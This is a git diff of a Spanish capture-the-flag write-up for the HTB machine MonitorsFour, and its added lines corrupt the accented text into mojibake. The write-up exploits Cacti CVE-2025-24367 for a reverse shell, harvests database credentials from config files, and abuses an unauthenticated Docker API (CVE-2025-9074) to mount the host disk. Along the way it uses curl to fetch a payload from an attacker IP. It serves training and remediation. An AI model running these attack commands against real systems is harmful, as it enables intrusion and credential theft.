@@ -1,9 +1,9 @@
----
+﻿---
 layout: single
 classes: wide
-title: "HTB MonitorsFour - Writeup"
+title: "MonitorsFour - Writeup"
 date: 2026-05-21
-difficulty: Fácil
+difficulty: FÃ¡cil
 operating_system: Windows
 service_hint: Cacti + CVE-2025-24367 + Docker API
 tags:
@@ -13,28 +13,28 @@ tags:
   - Docker API
   - RCE
   - Privilege Escalation
-  - Fácil
-summary: "Cadena de explotación: fuzzing de subdominios descubre Cacti 1.2.28, endpoint web filtra credenciales de usuario, y CVE-2025-24367 proporciona RCE autenticado como www-data. Desde el contenedor se abusa de la Docker API expuesta en la red interna para montar el filesystem del host y leer la flag de Administrador."
+  - FÃ¡cil
+summary: "Cadena de explotaciÃ³n: fuzzing de subdominios descubre Cacti 1.2.28, endpoint web filtra credenciales de usuario, y CVE-2025-24367 proporciona RCE autenticado como www-data. Desde el contenedor se abusa de la Docker API expuesta en la red interna para montar el filesystem del host y leer la flag de Administrador."
 ---
 
-## Información general
+## InformaciÃ³n general
 
 | Campo | Valor |
 |-------|-------|
 | Sistema operativo | Windows |
-| Dificultad | Fácil |
+| Dificultad | FÃ¡cil |
 | Tags | `CVE-2025-24367`, `CVE-2025-9074`, `Cacti`, `Docker API`, `RCE`, `Privilege Escalation` |
 {: .info-table}
 
 ## Reconocimiento
 
-Empezamos con un escaneo completo de puertos para descubrir los servicios expuestos en la máquina Windows. Queríamos identificar todos los puntos de entrada disponibles antes de profundizar.
+Empezamos con un escaneo completo de puertos para descubrir los servicios expuestos en la mÃ¡quina Windows. QuerÃ­amos identificar todos los puntos de entrada disponibles antes de profundizar.
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.1.174 -oG allPorts
 ```
 
-Con los puertos identificados, hicimos un escaneo más detallado con scripts de servicio para obtener versiones, banners y confirmar los fingerprints.
+Con los puertos identificados, hicimos un escaneo mÃ¡s detallado con scripts de servicio para obtener versiones, banners y confirmar los fingerprints.
 
 ```bash
 nmap -p80,5985 -sCV 10.129.1.174 -oN targeted
@@ -43,17 +43,17 @@ nmap -p80,5985 -sCV 10.129.1.174 -oN targeted
 Los indicadores clave de esta fase fueron:
 
 - `80/tcp` expone **nginx** con PHP 8.3.27 y redirige a `monitorsfour.htb`.
-- `5985/tcp` confirma WinRM accesible, útil para acceso posterior con credenciales válidas.
+- `5985/tcp` confirma WinRM accesible, Ãºtil para acceso posterior con credenciales vÃ¡lidas.
 
-## Enumeración
+## EnumeraciÃ³n
 
-Una vez agregado el dominio al `/etc/hosts`, identificamos las tecnologías del sitio con WhatWeb para saber con qué frameworks y servidores estamos tratando antes de profundizar en la enumeración.
+Una vez agregado el dominio al `/etc/hosts`, identificamos las tecnologÃ­as del sitio con WhatWeb para saber con quÃ© frameworks y servidores estamos tratando antes de profundizar en la enumeraciÃ³n.
 
 ```bash
 whatweb http://monitorsfour.htb/
 ```
 
-Fuzzeamos directorios con feroxbuster para descubrir rutas ocultas dentro de la aplicación web que no son accesibles desde la navegación normal.
+Fuzzeamos directorios con feroxbuster para descubrir rutas ocultas dentro de la aplicaciÃ³n web que no son accesibles desde la navegaciÃ³n normal.
 
 ```bash
 feroxbuster -u http://monitorsfour.htb -t 50
@@ -65,46 +65,46 @@ Buscamos subdominios adicionales con wfuzz, que fue clave para encontrar el pane
 wfuzz -H "Host: FUZZ.monitorsfour.htb" --hc 404,403 -c --hh 138 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://monitorsfour.htb
 ```
 
-El hallazgo crítico fue el subdominio `cacti.monitorsfour.htb`, que expone una instalación de **Cacti versión 1.2.28**.
+El hallazgo crÃ­tico fue el subdominio `cacti.monitorsfour.htb`, que expone una instalaciÃ³n de **Cacti versiÃ³n 1.2.28**.
 
-## Metodología de análisis del vector inicial
+## MetodologÃ­a de anÃ¡lisis del vector inicial
 
-El vector de entrada se priorizó en el subdominio `cacti.monitorsfour.htb` porque la versión 1.2.28 de Cacti tiene vulnerabilidades RCE autenticadas conocidas. El endpoint `/user?token=0` encontrado en el sitio principal filtraba información de usuarios sin autenticación, proporcionando nombres de cuenta potenciales para acceder a Cacti.
+El vector de entrada se priorizÃ³ en el subdominio `cacti.monitorsfour.htb` porque la versiÃ³n 1.2.28 de Cacti tiene vulnerabilidades RCE autenticadas conocidas. El endpoint `/user?token=0` encontrado en el sitio principal filtraba informaciÃ³n de usuarios sin autenticaciÃ³n, proporcionando nombres de cuenta potenciales para acceder a Cacti.
 
-La presencia de un dump SQL accesible públicamente en la instalación de Cacti permitió obtener hashes de contraseña, y la funcionalidad de subida de plantillas en Cacti proporcionaba el vector para convertir acceso autenticado en ejecución remota de código.
+La presencia de un dump SQL accesible pÃºblicamente en la instalaciÃ³n de Cacti permitiÃ³ obtener hashes de contraseÃ±a, y la funcionalidad de subida de plantillas en Cacti proporcionaba el vector para convertir acceso autenticado en ejecuciÃ³n remota de cÃ³digo.
 
-## Investigación de vulnerabilidades
+## InvestigaciÃ³n de vulnerabilidades
 
-Dos CVEs documentadas guiaron la fase de investigación:
+Dos CVEs documentadas guiaron la fase de investigaciÃ³n:
 
-- **CVE-2025-24367**: Vulnerabilidad de RCE autenticada en Cacti que permite a un usuario con acceso al panel subir una plantilla maliciosa que ejecuta código PHP en el servidor, proporcionando una shell en el contenedor web.
-- **CVE-2025-9074**: Vulnerabilidad crítica (CVSS 9.3) en Docker Desktop que expone la Docker API sin autenticación en la subred interna `192.168.65.0/24`, permitiendo a cualquier contenedor Linux crear contenedores privilegiados con montajes del sistema de archivos del host.
+- **CVE-2025-24367**: Vulnerabilidad de RCE autenticada en Cacti que permite a un usuario con acceso al panel subir una plantilla maliciosa que ejecuta cÃ³digo PHP en el servidor, proporcionando una shell en el contenedor web.
+- **CVE-2025-9074**: Vulnerabilidad crÃ­tica (CVSS 9.3) en Docker Desktop que expone la Docker API sin autenticaciÃ³n en la subred interna `192.168.65.0/24`, permitiendo a cualquier contenedor Linux crear contenedores privilegiados con montajes del sistema de archivos del host.
 
 ![Panel de login de Cacti 1.2.28](/images/writeups/monitorsfour/Pasted image 20260521120236.png)
 
-Descargamos el dump SQL de Cacti que está accesible públicamente desde la instalación. Los dumps de instalación suelen contener credenciales por defecto que podemos aprovechar si no fueron cambiadas.
+Descargamos el dump SQL de Cacti que estÃ¡ accesible pÃºblicamente desde la instalaciÃ³n. Los dumps de instalaciÃ³n suelen contener credenciales por defecto que podemos aprovechar si no fueron cambiadas.
 
 ```bash
 curl -s http://cacti.monitorsfour.htb/cacti/cacti.sql -o cacti.sql
 ```
 
-Buscamos en el dump las sentencias INSERT INTO user para encontrar los usuarios y sus hashes de contraseña. Así identificamos las cuentas predefinidas de Cacti.
+Buscamos en el dump las sentencias INSERT INTO user para encontrar los usuarios y sus hashes de contraseÃ±a. AsÃ­ identificamos las cuentas predefinidas de Cacti.
 
 ```bash
 grep -i "INSERT INTO user" -n cacti.sql
 ```
 
-Encontramos el hash MD5 del usuario `admin` (`21232f297a57a5a743894a0e4a801fc3`) que corresponde a `admin`, pero la contraseña ya había sido cambiada en el sistema activo.
+Encontramos el hash MD5 del usuario `admin` (`21232f297a57a5a743894a0e4a801fc3`) que corresponde a `admin`, pero la contraseÃ±a ya habÃ­a sido cambiada en el sistema activo.
 
-## Explotación
+## ExplotaciÃ³n
 
-Durante la enumeración web descubrimos un endpoint `/user?token=0` que filtra información de usuarios sin necesidad de autenticación. Consultamos el listado completo de usuarios para obtener nombres y roles.
+Durante la enumeraciÃ³n web descubrimos un endpoint `/user?token=0` que filtra informaciÃ³n de usuarios sin necesidad de autenticaciÃ³n. Consultamos el listado completo de usuarios para obtener nombres y roles.
 
 ```bash
 curl http://monitorsfour.htb/user?token=0
 ```
 
-El endpoint devolvió los siguientes usuarios:
+El endpoint devolviÃ³ los siguientes usuarios:
 
 | Username | Rol | Nombre |
 |----------|-----|--------|
@@ -113,15 +113,15 @@ El endpoint devolvió los siguientes usuarios:
 | `janderson` | user | Jennifer Anderson |
 | `dthompson` | user | David Thompson |
 
-El nombre real de `admin` era **Marcus Higgins**, lo que sugería que el usuario local `marcus` podía existir en el sistema. Probamos credenciales contra Cacti y el usuario `marcus` con contraseña `[REDACTED]` funcionó.
+El nombre real de `admin` era **Marcus Higgins**, lo que sugerÃ­a que el usuario local `marcus` podÃ­a existir en el sistema. Probamos credenciales contra Cacti y el usuario `marcus` con contraseÃ±a `[REDACTED]` funcionÃ³.
 
-Cacti 1.2.28 tiene una vulnerabilidad RCE autenticada conocida como CVE-2025-24367. Clonamos un PoC público para explotarla y obtener acceso al contenedor.
+Cacti 1.2.28 tiene una vulnerabilidad RCE autenticada conocida como CVE-2025-24367. Clonamos un PoC pÃºblico para explotarla y obtener acceso al contenedor.
 
 ```bash
 git clone https://github.com/SoftAndoWetto/CVE-2025-24367-PoC-Cacti.git
 ```
 
-Con las credenciales de marcus apuntando a nuestra IP, ejecutamos el exploit para que suba un payload PHP mediante manipulación de plantillas y nos devuelva una shell reversa desde el contenedor Cacti.
+Con las credenciales de marcus apuntando a nuestra IP, ejecutamos el exploit para que suba un payload PHP mediante manipulaciÃ³n de plantillas y nos devuelva una shell reversa desde el contenedor Cacti.
 
 ```bash
 python3 exploit.py
@@ -140,7 +140,7 @@ bash: no job control in this shell
 www-data@821fbd6a43fa:~/html/cacti$
 ```
 
-Una vez dentro del contenedor, buscamos credenciales en los archivos de configuración clave. Primero revisamos el `.env` de la aplicación, que suele contener credenciales de base de datos y otros secretos.
+Una vez dentro del contenedor, buscamos credenciales en los archivos de configuraciÃ³n clave. Primero revisamos el `.env` de la aplicaciÃ³n, que suele contener credenciales de base de datos y otros secretos.
 
 ```bash
 www-data@821fbd6a43fa:~/html/cacti$ cat /var/www/app/.env
@@ -151,13 +151,13 @@ DB_USER=monitorsdbuser
 DB_PASS=[REDACTED]
 ```
 
-Seguimos con el archivo de configuración principal de Cacti. Primero filtramos por "user" para localizar las líneas de credenciales de la base de datos.
+Seguimos con el archivo de configuraciÃ³n principal de Cacti. Primero filtramos por "user" para localizar las lÃ­neas de credenciales de la base de datos.
 
 ```bash
 www-data@821fbd6a43fa:~/html/cacti$ cat /var/www/html/cacti/include/config.php | grep user
 ```
 
-También revisamos los archivos de configuración de Cacti para encontrar las credenciales de su propia base de datos MySQL. Con la contraseña obtenida nos conectamos a MariaDB para explorar las tablas internas del sistema.
+TambiÃ©n revisamos los archivos de configuraciÃ³n de Cacti para encontrar las credenciales de su propia base de datos MySQL. Con la contraseÃ±a obtenida nos conectamos a MariaDB para explorar las tablas internas del sistema.
 
 ```bash
 www-data@821fbd6a43fa:~/html/cacti$ grep -Ei "user|pass|host|database|db_|mysql|mysqli|port" /var/www/html/cacti/include/config.php
@@ -192,7 +192,7 @@ MariaDB [cacti]> SELECT id,username,password FROM user_auth;
 
 ## Escalada de privilegios
 
-Desde el contenedor no tenemos acceso directo al host Windows, pero podemos explorar la red interna de Docker. Creamos un script que escanea la subred 192.168.65.0/24 buscando la Docker API expuesta sin autenticación en el puerto 2375.
+Desde el contenedor no tenemos acceso directo al host Windows, pero podemos explorar la red interna de Docker. Creamos un script que escanea la subred 192.168.65.0/24 buscando la Docker API expuesta sin autenticaciÃ³n en el puerto 2375.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ cat << 'EOF' > scan.sh
@@ -205,7 +205,7 @@ done
 EOF
 ```
 
-Damos permisos de ejecución al script y lo lanzamos. Escanea toda la subred y encuentra la Docker API abierta sin autenticación en 192.168.65.7:2375.
+Damos permisos de ejecuciÃ³n al script y lo lanzamos. Escanea toda la subred y encuentra la Docker API abierta sin autenticaciÃ³n en 192.168.65.7:2375.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ chmod +x scan.sh
@@ -213,7 +213,7 @@ www-data@821fbd6a43fa:/tmp$ ./scan.sh
 [+] Docker API OPEN: 192.168.65.7:2375
 ```
 
-El host `192.168.65.7:2375` tiene la Docker API expuesta sin autenticación. Esta exposición se debe al **CVE-2025-9074**, una vulnerabilidad crítica (CVSS 9.3) en Docker Desktop que permite a cualquier contenedor Linux acceder al motor Docker a través de la subred interna `192.168.65.0/24` sin necesidad de montar el socket de Docker, posibilitando la creación de contenedores privilegiados que montan el sistema de archivos del host. Listamos las imágenes disponibles en el motor Docker para identificar qué contenedores existen y cuál podemos usar como base para montar el sistema de archivos del host.
+El host `192.168.65.7:2375` tiene la Docker API expuesta sin autenticaciÃ³n. Esta exposiciÃ³n se debe al **CVE-2025-9074**, una vulnerabilidad crÃ­tica (CVSS 9.3) en Docker Desktop que permite a cualquier contenedor Linux acceder al motor Docker a travÃ©s de la subred interna `192.168.65.0/24` sin necesidad de montar el socket de Docker, posibilitando la creaciÃ³n de contenedores privilegiados que montan el sistema de archivos del host. Listamos las imÃ¡genes disponibles en el motor Docker para identificar quÃ© contenedores existen y cuÃ¡l podemos usar como base para montar el sistema de archivos del host.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
@@ -240,19 +240,19 @@ www-data@821fbd6a43fa:/tmp$ nano payload.json
 }
 ```
 
-Levantamos un servidor HTTP en nuestra máquina atacante para que el contenedor víctima pueda descargar el payload JSON.
+Levantamos un servidor HTTP en nuestra mÃ¡quina atacante para que el contenedor vÃ­ctima pueda descargar el payload JSON.
 
 ```bash
 python3 -m http.server 8000
 ```
 
-Desde el contenedor víctima, descargamos el payload JSON usando curl apuntando a nuestro servidor HTTP atacante.
+Desde el contenedor vÃ­ctima, descargamos el payload JSON usando curl apuntando a nuestro servidor HTTP atacante.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ curl http://10.10.14.150:8000/payload.json -o /tmp/payload.json
 ```
 
-Enviamos el payload JSON a la Docker API para crear un contenedor Alpine que monte el disco del host. La API nos devuelve el ID del contenedor creado, lo que confirma que el motor aceptó la solicitud.
+Enviamos el payload JSON a la Docker API para crear un contenedor Alpine que monte el disco del host. La API nos devuelve el ID del contenedor creado, lo que confirma que el motor aceptÃ³ la solicitud.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ curl -X POST -H "Content-Type: application/json" -d @/tmp/payload.json http://192.168.65.7:2375/containers/create?name=pwned
@@ -274,7 +274,7 @@ www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/containers/20dd4fc655b
 
 **Flag de root:** `[REDACTED]`
 
-## Cadena de explotación
+## Cadena de explotaciÃ³n
 
 ```text
 Fuzzing de subdominios
@@ -296,21 +296,21 @@ Fuzzing de subdominios
 | `user.txt` | `[REDACTED]` |
 | `root.txt` | `[REDACTED]` |
 
-## Lecciones técnicas
+## Lecciones tÃ©cnicas
 
-1. Un endpoint sin autenticación que filtra usuarios puede proporcionar los nombres de cuenta necesarios para ataques de fuerza bruta o reutilización de credenciales en servicios internos.
-2. Los dumps SQL de instalación nunca deben ser accesibles públicamente, ya que contienen hashes y configuraciones por defecto.
-3. La Docker API expuesta sin autenticación en una subred interna equivale a compromiso total del host, ya que cualquier contenedor puede montar el sistema de archivos completo.
+1. Un endpoint sin autenticaciÃ³n que filtra usuarios puede proporcionar los nombres de cuenta necesarios para ataques de fuerza bruta o reutilizaciÃ³n de credenciales en servicios internos.
+2. Los dumps SQL de instalaciÃ³n nunca deben ser accesibles pÃºblicamente, ya que contienen hashes y configuraciones por defecto.
+3. La Docker API expuesta sin autenticaciÃ³n en una subred interna equivale a compromiso total del host, ya que cualquier contenedor puede montar el sistema de archivos completo.
 4. Las aplicaciones legacy como Cacti deben actualizarse o aislarse en redes separadas, especialmente cuando manejan credenciales de base de datos.
 
-## Conclusión
+## ConclusiÃ³n
 
-MonitorsFour resultó ser una máquina de dificultad **Fácil** que combinó dos vectores: la explotación de Cacti 1.2.28 mediante **CVE-2025-24367** para obtener acceso a un contenedor web, y el abuso de una **Docker API expuesta sin autenticación** en la red interna para montar el sistema de archivos del host y leer la flag de Administrador. La lección principal es que exponer un panel de Cacti en una versión vulnerable combinado con una API de Docker abierta convierte una intrusión web limitada en compromiso total del sistema.
+MonitorsFour resultÃ³ ser una mÃ¡quina de dificultad **FÃ¡cil** que combinÃ³ dos vectores: la explotaciÃ³n de Cacti 1.2.28 mediante **CVE-2025-24367** para obtener acceso a un contenedor web, y el abuso de una **Docker API expuesta sin autenticaciÃ³n** en la red interna para montar el sistema de archivos del host y leer la flag de Administrador. La lecciÃ³n principal es que exponer un panel de Cacti en una versiÃ³n vulnerable combinado con una API de Docker abierta convierte una intrusiÃ³n web limitada en compromiso total del sistema.
 
-## Remediación
+## RemediaciÃ³n
 
-1. Actualizar Cacti a una versión que parchee CVE-2025-24367 o migrar a una alternativa más segura.
-2. Eliminar el endpoint `/user?token=0` o requerir autenticación para acceder a información de usuarios.
-3. No exponer dumps SQL de instalación en el directorio web público.
-4. Configurar la Docker API para requerir autenticación TLS y no exponerla en subredes accesibles desde contenedores no privilegiados.
+1. Actualizar Cacti a una versiÃ³n que parchee CVE-2025-24367 o migrar a una alternativa mÃ¡s segura.
+2. Eliminar el endpoint `/user?token=0` o requerir autenticaciÃ³n para acceder a informaciÃ³n de usuarios.
+3. No exponer dumps SQL de instalaciÃ³n en el directorio web pÃºblico.
+4. Configurar la Docker API para requerir autenticaciÃ³n TLS y no exponerla en subredes accesibles desde contenedores no privilegiados.
 5. Aplicar el parche de seguridad correspondiente a CVE-2025-9074 en Docker Desktop.
